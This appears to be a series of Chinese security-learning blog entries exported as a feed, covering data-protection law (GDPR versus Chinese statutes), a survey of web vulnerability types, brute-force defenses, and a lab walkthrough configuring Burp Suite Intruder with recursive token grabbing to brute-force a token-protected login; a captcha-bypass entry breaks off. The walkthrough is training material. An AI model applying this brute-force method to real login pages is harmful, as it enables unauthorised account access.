title="国内："></a>国内：</h6><p>&emsp;&emsp;在立法方面，从2017年的《网络安全法》、2020的《民法典》到2021年的《数据安全法》等等，越来越多关注数据安全的法律规出台。这也表明了我国对数据安全的高度重视。</p><p>&emsp;&emsp;在执法方面，我国监管部门重视的方面主要有两个，一个是针对APP个人信息授权专项治理（滴滴事件等），一个是针对个人信息非法交易与黑灰产的整治。（净网行动）</p><p>&emsp;</p><h4 id="5-数据安全合规热点与解读"><a href="#5-数据安全合规热点与解读" class="headerlink" title="5.数据安全合规热点与解读"></a>5.数据安全合规热点与解读</h4><p>&emsp;</p><h6 id="emsp-0）前言"><a href="#emsp-0）前言" class="headerlink" title="&emsp;0）前言"></a>&emsp;0）前言</h6><p>&emsp;&emsp;&emsp;由于欧盟的《GDPR》出台具有很大的代表性，所以绿盟的报告才将该法作为典型与我国的法律进行比较，获得共同点和差异处（个人理解）</p><p>&emsp;</p><h6 id="emsp-1）保护对象："><a href="#emsp-1）保护对象：" class="headerlink" title="&emsp;1）保护对象："></a>&emsp;1）保护对象：</h6><p>&emsp;&emsp;&emsp;《GDPR》保护对象是公民的“个人数据”，值得一提的是其对个人数据的定义是比较广泛的。涵盖信息十分丰富，包括了指纹、虹膜和DNA数据等特殊的数据。</p><p>&emsp;&emsp;&emsp;《网络安全法》明确了保护的重点数据对象是“个人信息”。相比 GDPR来说，我国罗列的个人信息范畴并不大，并不包括由个人关联的信息（比如用户的行为 / 习惯等识别性不高的信息），这在一定程度缩小了“个人信息”的范围，降低敏感信息分类分级及保护的成本。当然，在个人信息保护法中有了更加宽泛定义的倾向。</p><p>&emsp;</p><h6 id="emsp-2）用户的数据权利："><a href="#emsp-2）用户的数据权利：" class="headerlink" title="&emsp;2）用户的数据权利："></a>&emsp;2）用户的数据权利：</h6><p>&emsp;&emsp;&emsp;《GDPR》赋予了“数据主体”（或称用户）知情权、访问权、修改权、限制处理权、<br>删除权（也称“被遗忘权”）、可携带权、拒绝权等多项权利。 “被遗忘权”和“可携带权”是 GDPR新增两项用户“特权”。</p><p>&emsp;&emsp;&emsp;《网络安全法》赋予了用户一定程度的“删除权”和“修改权”，而在《个人信息保护法》中则赋予了用户更丰富更具体的数据权利（知情权、访问权、被解释权等）</p><p>&emsp;</p><h6 id="emsp-3）企业的安全义务"><a href="#emsp-3）企业的安全义务" class="headerlink" title="&emsp;3）企业的安全义务"></a>&emsp;3）企业的安全义务</h6><p>&emsp;&emsp;&emsp;《GDPR》规定了企业必须响应和履行卫用户行使权利提供方便的义务，另外还要求了企业必须保存数据处理活动的记录和针对数据的安全措施</p><p>&emsp;&emsp;&emsp;在我国法律中同样要求企业要配合用户行使数据的权利，此外，企业在防止数据泄露、窃取篡改等数据安全事件上，需履行安全管理制度、组织和规范建设，落实有效的网络安全措施。</p><p>&emsp;&emsp;&emsp;确实对企业的要求不管是哪个国家都要求的差不多，在满足用户数据使用权利的前提下，保障用户数据的安全性。</p><p>&emsp;</p><h6 id="emsp-4）违法违规的处罚"><a href="#emsp-4）违法违规的处罚" class="headerlink" title="&emsp;4）违法违规的处罚"></a>&emsp;4）违法违规的处罚</h6><p>&emsp;&emsp;&emsp;《GDPR》可被处以最高 2000 万欧元的行政罚款，或对企业以最高占上一财政年度全球总营业额 4% 的行政罚款，取两者最高值。违反数据处理规定被处罚的代价是十分高昂的（贵的一批）</p><p>&emsp;&emsp;&emsp;我国的《网络安全法》中最高可处罚 100 万元的罚款，对直接负责的主管人员处罚最高 10 万元罚款。除罚款以外，还有责令暂停相关业务、关闭网站、吊销营业执照等严厉的行政处罚措施。在最近发布《个人信息保护法》中，对于个人信息的违法犯罪加大了处罚与罚款力度，对于违法情节严重的最高可以处罚 5000 万元以下或者上一年度营业额 5% 罚款，同时对直接负责的主管人员最高可罚款 100万元（看滴滴就知道了）</p><p>&emsp;</p><h6 id="emsp-5）小结"><a href="#emsp-5）小结" class="headerlink" title="&emsp;5）小结"></a>&emsp;5）小结</h6><p>&emsp;&emsp;&emsp;法律越来越完善，对于很多定义和行为也有了清楚的讲解，处罚也会越来越重视</p>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web漏洞类型</title>
    <link href="/2022/08/03/web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/"/>
    <url>/2022/08/03/web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="web漏洞类型"><a href="#web漏洞类型" class="headerlink" title="web漏洞类型"></a>web漏洞类型</h1><h4 id="1、漏洞类型导图"><a href="#1、漏洞类型导图" class="headerlink" title="1、漏洞类型导图"></a>1、漏洞类型导图</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/img/web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/1-16585448959291.png" style="zoom:67%;" /></h4><h4 id="2、漏洞等级划分"><a href="#2、漏洞等级划分" class="headerlink" title="2、漏洞等级划分"></a>2、漏洞等级划分</h4><p>&emsp;&emsp;漏洞等级取决于漏洞的危害程度，所以越威胁的漏洞，等级越高</p><p>&emsp;&emsp;（感觉自己说的是个屁，不确定，再闻闻）</p><h5 id="emsp-emsp-高危漏洞："><a href="#emsp-emsp-高危漏洞：" class="headerlink" title="&emsp;&emsp;高危漏洞："></a>&emsp;&emsp;高危漏洞：</h5><ul><li>SQL注入</li><li>文件上传</li><li>代码执行</li><li>未授权访问</li><li>命令执行</li></ul><h5 id="emsp-emsp-中危漏洞："><a href="#emsp-emsp-中危漏洞：" class="headerlink" title="&emsp;&emsp;中危漏洞："></a>&emsp;&emsp;中危漏洞：</h5><ul><li>反序列化</li><li>逻辑安全</li></ul><h5 id="emsp-emsp-低危漏洞："><a href="#emsp-emsp-低危漏洞：" class="headerlink" title="&emsp;&emsp;低危漏洞："></a>&emsp;&emsp;低危漏洞：</h5><ul><li>XXS攻击</li><li>目录遍历</li><li>文件读取</li></ul><h4 id="3、漏洞的简单介绍"><a href="#3、漏洞的简单介绍" class="headerlink" title="3、漏洞的简单介绍"></a>3、漏洞的简单介绍</h4><p>&emsp;&emsp;简单介绍下各个漏洞混个脸熟先，搞技术没有操作过程进行讲解就是耍流氓，后续会通过题目讲解</p><h5 id="1）SQL注入"><a href="#1）SQL注入" class="headerlink" title="1）SQL注入"></a>1）SQL注入</h5><p>&emsp;&emsp;SQL 注入是一种非常常见的数据库攻击手段，SQL 注入漏洞也是网络世界中最普遍的漏洞 之一。是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句]，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>&emsp;&emsp;（简单来说就是利用查库的变量伪造出数据库的语句进行增删改查的操作，一般查的实现比较多，所以能够泄漏得到数据库的信息）</p><p>&emsp;&emsp;危害：</p><ul><li>访问数据库数据，盗取信息</li><li>对数据库进行增删改查</li><li>如果网站目录存在写入权限，可以写入网页木马</li><li>提权</li><li>等等</li></ul><p>&emsp;</p><h5 id="2）文件上传"><a href="#2）文件上传" class="headerlink" title="2）文件上传"></a>2）文件上传</h5><p>&emsp;&emsp;文件上传是大部分Web应用都具备的功能，例如用户上传附件、修改头像、分享图片/视频等。正常的文件一般是文档、图片、视频等，Web应用收集之后放入后台存储，需要的时候再调用出来返回。</p><p>&emsp;&emsp;如果恶意文件如PHP、ASP等执行文件绕过Web应用，并顺利执行，则相当于黑客直接拿到了Webshell，则可以拿到Web应用的数据，删除Web文件，本地提权，进一步拿下整个服务器甚至内网。</p><p>&emsp;&emsp;危害：</p><ul><li>上传webshell，控制服务器，远程命令执行</li><li>上传系统百度、木马文件、构造僵尸网络</li><li>修改web界面</li><li>网络挂马和钓鱼</li><li>内网渗透</li><li>等等</li></ul><p>&emsp;</p><h5 id="3）XSS攻击（跨站脚本攻击）"><a href="#3）XSS攻击（跨站脚本攻击）" class="headerlink" title="3）XSS攻击（跨站脚本攻击）"></a>3）XSS攻击（跨站脚本攻击）</h5><p>&emsp;&emsp;XSS通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</p><p>&emsp;&emsp;（简单来讲，就是在输入的地方，将输入的值变成恶意指令代码，让后台去执行，我一直觉得其实和SQL差不多的想法，只是面向对象和实现的语言不同）</p><p>&emsp;&emsp;危害：</p><ul><li>窃取Cookie</li><li>未授权操作</li><li>网络挂马和钓鱼</li><li>植入广告和垃圾信息</li><li>等等</li></ul><p>&emsp;</p><h5 id="4）文件包含"><a href="#4）文件包含" class="headerlink" title="4）文件包含"></a>4）文件包含</h5><p>&emsp;&emsp;文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些具体文件，所以就会采用变量的形式来传递需要包含的文件，但是在使用包含文件的过程中，未对包含的变量进行检查及过滤，导致外部提交的恶意数据作为变量进入到了文件包含的过程中，从而导致提交的恶意数据被执行。</p><p>&emsp;&emsp;（单纯的描述其实有点绕，还是后续实践来讲清楚吧）</p><p>&emsp;&emsp;危害：</p><ul><li>web服务器的文件信息泄露</li><li>脚本被执行（篡改网站、非法操作、攻击其他网站等）</li><li>等等</li></ul><p>&emsp;</p><h5 id="5）反序列化"><a href="#5）反序列化" class="headerlink" title="5）反序列化"></a>5）反序列化</h5><p>&emsp;&emsp;序列化就是把对象转换成一种数据格式，如Json、XML等文本格式或二进制字节流格式，便于保存在内存、文件、数据库中或者在网络通信中进行传输。反序列化是序列化的逆过程，即由保存的文本格式或字节流格式还原成对象。</p><p>&emsp;&emsp;很多编程语言都提供了这一功能，但不幸的是，如果应用代码允许接受不可信的序列化数据，在进行反序列化操作时，可能会产生反序列化漏洞，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，被攻击者间接控制服务器</p><p>&emsp;&emsp;危害：</p><ul><li>拒绝服务</li><li>访问控制</li><li>远程命令执行</li><li>等等</li></ul><p>&emsp;</p><h5 id="6）代码执行"><a href="#6）代码执行" class="headerlink" title="6）代码执行"></a>6）代码执行</h5><p>&emsp;&emsp;由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。造成代码执行相关的函数分别是：eval、assert函数</p><p>&emsp;&emsp;危害：</p><ul><li>泄露服务器信息</li><li>木马植入</li><li>敏感文件暴露</li><li>远程命令执行</li><li>等等</li></ul><p>&emsp;</p><h5 id="7）逻辑漏洞"><a href="#7）逻辑漏洞" class="headerlink" title="7）逻辑漏洞"></a>7）逻辑漏洞</h5><p>&emsp;&emsp;逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又有水平越权和垂直越权两种。</p><p>&emsp;&emsp;危害：</p><ul><li>修改前端代码（比如改订单的金额）</li><li>密码修改或找回</li><li>等等（类型比较多）</li></ul><p>&emsp;</p><h5 id="8）未授权访问"><a href="#8）未授权访问" class="headerlink" title="8）未授权访问"></a>8）未授权访问</h5><p>&emsp;&emsp;未授权访问，顾名思义不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证页面存在缺陷，无认证，安全配置不当导致。常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。所以是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户。</p><p>&emsp;&emsp;危害：</p><ul><li>信息泄露</li><li>系统功能执行</li><li>等等</li></ul><p>&emsp;</p><h5 id="9）CSRF攻击（跨站点请求伪造）"><a href="#9）CSRF攻击（跨站点请求伪造）" class="headerlink" title="9）CSRF攻击（跨站点请求伪造）"></a>9）CSRF攻击（跨站点请求伪造）</h5><p>&emsp;&emsp;攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。攻击者利用网站对请求的验证漏洞而实现这样的攻击行为，网站能够确认请求来源于用户的浏览器，却不能验证请求是否源于用户的真实意愿下的操作行为。</p><p>&emsp;&emsp;（就是伪造成别人，拿着别人的认证信息混过网站的验证）</p><p>&emsp;&emsp;危害：</p><ul><li>盗取账号</li><li>转账</li><li>发送虚假消息</li><li>等等</li></ul><p>&emsp;</p><h5 id="10）SSRF攻击（服务器端请求伪造）"><a href="#10）SSRF攻击（服务器端请求伪造）" class="headerlink" title="10）SSRF攻击（服务器端请求伪造）"></a>10）SSRF攻击（服务器端请求伪造）</h5><p>&emsp;&emsp;大部分的web应用都提供了从其他的服务器上获取数据的功能。通过使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><p>&emsp;&emsp;一般情况下， SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>&emsp;&emsp;危害：</p><ul><li>内外网的端口和服务扫描</li><li>攻击运行在内网或本地的应用程序</li><li>攻击内网的web应用</li><li>读取本地敏感信息</li><li>等等</li></ul><p>&emsp;</p><h5 id="11）目录遍历"><a href="#11）目录遍历" class="headerlink" title="11）目录遍历"></a>11）目录遍历</h5><p>&emsp;&emsp;攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件</p><p>&emsp;&emsp;（就是麻瓜构建网络吧把整个目录结构给直接列出来了，这不是纯笨比吗，有目录了，信息收集的东西就越多，就越好搞攻击）</p><p>&emsp;&emsp;危害：</p><ul><li>访问敏感文件</li><li>等等</li></ul><p>&emsp;</p><h5 id="12）文件读取"><a href="#12）文件读取" class="headerlink" title="12）文件读取"></a>12）文件读取</h5><p>&emsp;&emsp;任意文件读取是属于文件操作漏洞的一种，通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感文件，正常读取的文件没有经过校验或者校验不严格，用户可以控制这个变量或者变量读取任意文件。</p><p>&emsp;&emsp;危害：</p><ul><li>获取敏感文件</li><li>等等</li></ul><p>&emsp;</p><h5 id="13）文件下载"><a href="#13）文件下载" class="headerlink" title="13）文件下载"></a>13）文件下载</h5><p>&emsp;&emsp;很多网站由于业务需求，往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击。</p><p>&emsp;&emsp;危害：</p><ul><li>获取敏感文件</li><li>等等</li></ul><p>&emsp;</p><h5 id="14）命令执行"><a href="#14）命令执行" class="headerlink" title="14）命令执行"></a>14）命令执行</h5><p>&emsp;&emsp;当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击</p><p>&emsp;&emsp;危害：</p><ul><li>获取web服务程序的权限</li><li>执行系统命令</li><li>反弹shell</li><li>内网渗透</li><li>等等</li></ul><p>&emsp;</p><h5 id="15）XXE攻击（XML外部实体注入）"><a href="#15）XXE攻击（XML外部实体注入）" class="headerlink" title="15）XXE攻击（XML外部实体注入）"></a>15）XXE攻击（XML外部实体注入）</h5><p>&emsp;&emsp;从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p><p>&emsp;&emsp;（这玩意还是实践比较容易弄清楚）</p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实习相关内容梳理（二）</title>
    <link href="/2022/08/03/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%9B%9B/"/>
    <url>/2022/08/03/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="实习相关内容梳理（二）"><a href="#实习相关内容梳理（二）" class="headerlink" title="实习相关内容梳理（二）"></a>实习相关内容梳理（二）</h1><p>&emsp;&emsp;今天依旧是梳理内容的一天捏。准备开始冲数据安全的技术层面啦٩(⊙o⊙*)و</p><h4 id="其他-数据出境相关概念解析"><a href="#其他-数据出境相关概念解析" class="headerlink" title="其他:数据出境相关概念解析"></a>其他:数据出境相关概念解析</h4><ul><li><p>第一部分：初阶–数据出境关键概念剖析</p></li><li><p>第二部分：进阶–《个人信息出境标准合同规定》高频问题与适用解读</p></li><li><p>第三部分：进阶–《数据出境安全评估办法》高频问题与适用解读</p></li><li><p>第四部分：高阶–  数据出海实践关键问题与海外SCC要点对比</p></li></ul><p>根据的公众号：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://mp.weixin.qq.com/s?__biz=MzU2NDk5Njg2OA==&amp;mid=2247489352&amp;idx=1&amp;sn=09b5bbca335c39c36b0d43b32e978e12&amp;chksm=fc432923cb34a0350243e4e9aebb1f0d245bb825b38d02f70e5833a8455e1361ca50b2a47e72&amp;scene=21#wechat_redirect<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何防范暴力破解</title>
    <link href="/2022/08/02/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/08/02/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="如何防范暴力破解"><a href="#如何防范暴力破解" class="headerlink" title="如何防范暴力破解"></a>如何防范暴力破解</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;暴力破解的学习基本就告一段落了，接下来将加入另外一个课题了，这也是对自己以前学习的回顾了，当然后面在打CTF或者一些平台练习有用到的话，那再开一个主题吧，毕竟还是想成为一个安服崽的啦。</p><h4 id="2-防范方法"><a href="#2-防范方法" class="headerlink" title="2.防范方法"></a>2.防范方法</h4><ul><li><p>增加密码的长度，密码的长度最好是大于10位数以上（毕竟电脑算力有限）</p></li><li><p>增加密码的复杂度，密码码要尽可能有数字、大小写字母和特殊符号混合组成</p></li><li><p>去除一些默认的登录账号（admin、root等），仅添加普通账号，授予root的权限</p></li><li><p>修改默认端口，ssh的默认端口是22 黑客想要入侵别人时需要先使用端口扫描工具 扫描外网当中那些服务器是开启了22端口，然后再进行暴力破解，因此改端口也是个好办法</p></li><li><p>借助第三方工具防御，通过第三方根据检测我们认证日志，如果发现有疑似暴力破解的行为，就会对相应IP采取动作，如禁止该IP的继续登录行为。</p><p>（第三方工具举例：<a href="http://www.fail2ban.org/">http://www.fail2ban.org/</a> ）</p></li></ul><h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h4><p>&emsp;&emsp;其实用kali里面也有相关的暴力破解根据，我下载了镜像，也实践了对压缩包密码的暴力破解，就是花的时间长（忘记截图水博客了，呜呜呜。等有空再重做一遍吧）</p><center><img src="/img/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/1.png" style="zoom: 150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于token防爆破的暴力破解</title>
    <link href="/2022/08/01/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/08/01/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于token防爆破的暴力破解"><a href="#基于token防爆破的暴力破解" class="headerlink" title="基于token防爆破的暴力破解"></a>基于token防爆破的暴力破解</h1><h4 id="前言：token防爆破原理"><a href="#前言：token防爆破原理" class="headerlink" title="前言：token防爆破原理"></a>前言：token防爆破原理</h4><p>&emsp;&emsp;① 当客户端发送请求时，服务器会对用户信息使用HS256算法及密钥进行签名，再将这个签名和数据一起作为Token一起返回给客户端</p><p>&emsp;&emsp;② 服务器不保存Token，客户端保存Token</p><p>&emsp;&emsp;③ 当客户端再次发送请求时，在请求信息中将Token一起发给服务器</p><p>&emsp;&emsp;④  服务器用同样的HS256算法和同样的密钥，对数据再进行一次签名，和客户端返回的Token的签名进行比较，如果验证成功，就向客户端返回请求的数据</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg"></p><p>&emsp;&emsp;简单来说，就是在High里面添加了一个token，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会先检查token，只有token正确，才会处理客户端的请求。</p><h4 id="1-打开登录界面"><a href="#1-打开登录界面" class="headerlink" title="1.打开登录界面"></a>1.打开登录界面</h4><p>&emsp;&emsp;可以看见没有验证码：</p><center><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg" style="zoom:67%;" /></center><h4 id="2-输-入账号密码查看反馈情况"><a href="#2-输-入账号密码查看反馈情况" class="headerlink" title="2.输/入账号密码查看反馈情况"></a>2.输/入账号密码查看反馈情况</h4><p>&emsp;&emsp;用户密码输入错误情况:</p><center><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;简单暴力破解的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg" style="zoom:67%;" /></center><h4 id="3-使用burp进行抓包"><a href="#3-使用burp进行抓包" class="headerlink" title="3.使用burp进行抓包"></a>3.使用burp进行抓包</h4><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg"></p><p>&emsp;&emsp;可以看见在数据包中存在token的使用来防止暴力破解，结合原理和前面的反馈，我们可以得知taken是每次提交都会发生变化的，所以如果我们想进行暴力破解的话要不就是把token给弄掉，要不就是每次破解自动获取新的token，当然第一种方法不现实（不攻击服务器没权限的话），所以我们尝试第二种办法。</p><h4 id="4-设置字典"><a href="#4-设置字典" class="headerlink" title="4.设置字典"></a>4.设置字典</h4><p>&emsp;&emsp;记住一定要forward数据包，在history中送到intruder板块，不然后面在设置Options递归内容的时候就看不到回应包的内容！！！！！！！！！！</p><p>&emsp;&emsp;（淦，我就吃了这个亏，一直没找到原因，我是傻呗！）</p><p>&emsp;&emsp;设置用户名和密码字典：</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p><h4 id="5-设置token的循环模式"><a href="#5-设置token的循环模式" class="headerlink" title="5.设置token的循环模式"></a>5.设置token的循环模式</h4><p>&emsp;&emsp;而token这里把type值修改为Recursive grep，也就是递归模式（也就是接着上一个的服务器个id值一直接力下去）</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.jpg"></p><p>&emsp;&emsp;在Options设置递归内容，要复制token此时的value内容</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p><p>&emsp;&emsp;复制到对应地方,位置就是在type值修改为Recursive grep的界面往下拉</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p><h4 id="6-设置线程数量"><a href="#6-设置线程数量" class="headerlink" title="6.设置线程数量"></a>6.设置线程数量</h4><p>&emsp;&emsp;必须把number of threads（线程）设置为1（因为，每次都需要去查看token的值，所以一次发一个，并且查看一个token）我用的burp pro 所以在Resource Pool里面设置，在burp版本中是在Options中设置，自己看着来吧。</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.jpg"></p><p>&emsp;&emsp;然后在Options中设置始终追随重定向</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.jpg"></p><h4 id="7-暴力就完事"><a href="#7-暴力就完事" class="headerlink" title="7.暴力就完事"></a>7.暴力就完事</h4><p>&emsp;&emsp;做完一切准备工作了，开始爆破</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.jpg"></p><p>&emsp;&emsp;可以看见显示爆破成功。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于验证码绕过（on server）的暴力破解</title>
    <link href="/2022/07/31/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/07/31/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于验证码绕过（on-server）的暴力破解"><a href="#基于验证码绕过（on-server）的暴力破解" class="headerlink" title="基于验证码绕过（on server）的暴力破解"></a>基于验证码绕过（on server）的暴力破解</h1><h4 id="1-打开登录界面"><a href="#1-打开登录界面" class="headerlink" title="1.打开登录界面"></a>1.打开登录界面</h4><p>&emsp;&emsp;可以看见存在验证码识别:</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg" style="zoom:80%;" /></center><h4 id="2-输入账号密码查看反馈情况"><a href="#2-输入账号密码查看反馈情况" class="headerlink" title="2.输入账号密码查看反馈情况"></a>2.输入账号密码查看反馈情况</h4><p>&emsp;&emsp;用户密码输入错误情况</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg" style="zoom: 67%;" /></center><p>&emsp;&emsp;验证码错误的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;验证码为空的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg" style="zoom: 50%;" /></center><h4 id="3-使用burp进行抓包查看"><a href="#3-使用burp进行抓包查看" class="headerlink" title="3.使用burp进行抓包查看"></a>3.使用burp进行抓包查看</h4><p><img 